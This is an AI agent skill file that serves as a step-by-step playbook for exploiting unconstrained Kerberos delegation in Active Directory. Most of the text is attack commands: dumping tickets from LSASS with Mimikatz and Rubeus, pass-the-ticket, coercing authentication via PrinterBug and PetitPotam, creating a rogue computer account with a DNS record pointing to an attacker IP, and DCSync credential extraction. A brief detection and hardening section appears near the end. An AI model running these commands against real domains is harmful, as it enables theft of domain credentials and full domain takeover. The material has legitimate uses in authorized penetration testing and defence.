---
name: unconstrained-delegation
description: Active Directory security assessment skill for detecting and exploiting unconstrained delegation vulnerabilities. Use this skill whenever the user mentions Active Directory, Kerberos delegation, TGT dumping, LSASS memory, unconstrained delegation, or wants to assess AD security. Also trigger for scenarios involving domain compromise, ticket harvesting, or Kerberos abuse techniques. Make sure to use this skill for any AD penetration testing, red team operations, or security assessments involving delegation attacks.
---

# Unconstrained Delegation Assessment

A comprehensive guide for detecting and exploiting unconstrained delegation vulnerabilities in Active Directory environments.

## What is Unconstrained Delegation?

Unconstrained delegation is a feature that allows a Domain Administrator to configure any computer in the domain to receive and cache TGTs (Ticket Granting Tickets) from users who authenticate to it. When a user logs into a computer with unconstrained delegation enabled:

1. A copy of the user's TGT is sent inside the TGS provided by the Domain Controller
2. The TGT is saved in memory in LSASS
3. If you have Administrator privileges on that machine, you can dump the tickets and impersonate users anywhere in the domain

**Critical Impact**: If a Domain Admin logs into a computer with unconstrained delegation enabled, and you have local admin privileges on that machine, you can dump the ticket and impersonate the Domain Admin anywhere (full domain compromise).

## Detection: Finding Unconstrained Delegation Computers

### Method 1: Using PowerView (PowerShell)

```powershell
# List all computers with unconstrained delegation enabled
Get-DomainComputer –Unconstrained –Properties name

# Alternative LDAP filter approach
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
```

### Method 2: Using ADSearch

```bash
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  --attributes samaccountname,dnsHostName,operatingSystem
```

### Method 3: Using the helper script

```bash
python3 scripts/find_unconstrained_computers.py --domain <DOMAIN> --dc-ip <DC_IP> <USER>:<PASS>
```

**Note**: Domain Controllers always appear in unconstrained delegation results and might be useful for cross-domain attacks.

## Exploitation: Ticket Harvesting

### Step 1: Export Tickets from LSASS

```bash
# Using Mimikatz (recommended)
privilege::debug
sekurlsa::tickets /export

# Alternative method
kerberos::list /export

# Using Rubeus (doesn't access LSASS directly, uses Windows APIs)
Rubeus.exe dump

# Monitor for new tickets in real-time
Rubeus.exe monitor /interval:10 [/filteruser:<username>]
```

### Step 2: Load and Use Tickets

```bash
# Mimikatz - Pass the Ticket
kerberos::ptt <ticket.kirbi>

# Rubeus - Pass the Ticket
Rubeus.exe ptt /ticket:<base64_ticket>

# After loading, you can access resources as the impersonated user
```

## Advanced: Force Authentication Attack

If you compromise a computer with unconstrained delegation, you can trick other systems to authenticate to it, harvesting their TGTs.

### Using SpoolSample (Print Server Coercion)

```bash
# Force a print server to authenticate to your unconstrained delegation machine
.\SpoolSample.exe <printmachine> <unconstrainedmachine>
```

### Other Coercion Vectors

- **PrinterBug/MS-RPRN**: Print Spooler RPC vulnerability
- **PetitPotam/EFSRPC**: EFS RPC vulnerability
- **DFSCoerce**: DFS-R replication vulnerability
- **MSEven**: Event Log RPC vulnerability

## Advanced: Attacker-Created Computer Attack

Modern domains often have `MachineAccountQuota > 0` (default 10), allowing authenticated users to create computer objects. Combined with `SeEnableDelegationPrivilege`, this enables a powerful attack chain.

### Complete Attack Flow

#### 1. Create a Computer You Control

```bash
# Using Impacket (any authenticated user if MachineAccountQuota > 0)
python3 addcomputer.py -computer-name <FAKEHOST> \
  -computer-pass '<Strong.Passw0rd>' \
  -dc-ip <DC_IP> \
  <DOMAIN>/<USER>:'<PASS>'
```

#### 2. Make the Fake Hostname Resolvable

```bash
# Add DNS A record pointing to your listener
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add \
  --record <FAKEHOST>.<DOMAIN_FQDN> \
  --type A \
  --data <ATTACKER_IP> \
  -dns-ip <DC_IP> \
  <DC_FQDN>
```

#### 3. Enable Unconstrained Delegation

```bash
# Requires SeEnableDelegationPrivilege (domain admins or delegated admins)
# Using BloodyAD
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' \
  --host <DC_FQDN> \
  add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

#### 4. Prepare for Ticket Export

```bash
# Compute NT hash of machine account password
python3 scripts/compute_nt_hash.py '<Strong.Passw0rd>'

# Launch krbrelayx to export inbound TGTs
python3 krbrelayx.py -hashes :<NT_HASH>
```

#### 5. Coerce Authentication

```bash
# Using netexec coerce_plus module
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  -M coerce_plus \
  -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> \
  METHOD=PrinterBug

# Other methods: PetitPotam, DFSCoerce, MSEven
```

#### 6. Perform DCSync with Captured DC TGT

```bash
# Generate krb5.conf
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use captured ccache for DCSync
KRB5CCNAME=<captured_ccache_file> \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternative with Impacket
KRB5CCNAME=<captured_ccache_file> \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

### Requirements Checklist

- [ ] `MachineAccountQuota > 0` (or explicit computer creation rights)
- [ ] `SeEnableDelegationPrivilege` to set TRUSTED_FOR_DELEGATION
- [ ] DNS A record for fake host pointing to attacker IP
- [ ] Viable coercion vector available (PrinterBug, PetitPotam, etc.)

## Detection and Hardening

### Detection Indicators

| Event ID | Description |
|----------|-------------|
| 4741 | Computer account created |
| 4742/4738 | Computer/user account changed (watch for TRUSTED_FOR_DELEGATION) |
| 4768/4769 | Kerberos TGT/TGS requests from unexpected hosts |
| DNS | Unusual A-record additions in domain zone |

### Hardening Recommendations

1. **Limit privileged logins**: Restrict DA/Admin logins to specific service accounts
2. **Set sensitive flag**: Configure "Account is sensitive and cannot be delegated" for privileged accounts
3. **Restrict delegation privilege**: Limit `SeEnableDelegationPrivilege` to minimal set
4. **Disable computer creation**: Set `MachineAccountQuota=0` where feasible
5. **Disable Print Spooler on DCs**: Removes PrinterBug attack vector
6. **Enforce security features**: LDAP signing and channel binding
7. **Monitor delegation changes**: Alert on UAC TRUSTED_FOR_DELEGATION modifications

## Quick Reference

### LDAP Filter for Unconstrained Delegation
```
(userAccountControl:1.2.840.113556.1.4.803:=524288)
```

### Key Tools
- **PowerView**: `Get-DomainComputer –Unconstrained`
- **Mimikatz**: `sekurlsa::tickets /export`
- **Rubeus**: `dump`, `monitor`, `ptt`
- **Impacket**: `addcomputer.py`, `secretsdump.py`
- **BloodyAD**: UAC manipulation
- **netexec**: Coercion and DCSync
- **krbrelayx**: TGT export and relay

### Attack Decision Tree

1. **Can you find unconstrained delegation computers?**
   - Yes → Check for privileged user logins → Dump tickets
   - No → Check MachineAccountQuota → Create attacker computer

2. **Do you have SeEnableDelegationPrivilege?**
   - Yes → Enable delegation on attacker computer → Coerce authentication
   - No → Look for existing unconstrained delegation targets

3. **Can you coerce a DC to authenticate?**
   - Yes → Capture DC TGT → DCSync → Full domain compromise
   - No → Target other privileged systems

## References

- [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [Impacket](https://github.com/fortra/impacket)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [netexec](https://github.com/Pennyw0rth/NetExec)
- [SpoolSample](https://github.com/leechristensen/SpoolSample)
